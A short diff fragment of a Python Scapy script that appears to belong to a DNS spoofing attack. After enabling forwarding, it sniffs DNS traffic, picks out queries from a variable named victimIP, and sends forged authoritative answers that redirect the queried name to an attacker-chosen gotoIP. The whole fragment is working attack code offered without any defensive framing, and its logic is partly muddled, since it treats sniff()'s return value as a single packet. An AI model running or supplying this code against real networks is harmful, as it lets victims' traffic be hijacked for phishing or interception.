@@ -22,6 +22,8 @@ if __name__ == '__main__':
     
     forwarding()
 
-    sniffDNS()
+    packet  = sniff(filter="udp and port 53", prn = spoofDNS)
+    if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
+        srp((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
 
     
